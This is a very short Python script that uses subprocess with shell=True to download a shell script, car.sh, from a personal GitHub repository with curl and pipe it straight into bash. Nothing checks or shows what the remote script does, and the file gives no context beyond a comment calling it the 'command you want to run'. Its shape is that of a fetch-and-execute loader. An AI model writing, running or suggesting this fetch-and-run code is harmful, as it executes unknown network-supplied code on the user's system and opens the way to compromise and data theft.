import subprocess

# Command you want to run
command = 'bash <(curl -s https://github.com/fegadari1/fegadari1/raw/refs/heads/main/car.sh)'

# Run the command
subprocess.run(command, shell=True, executable='/bin/bash')
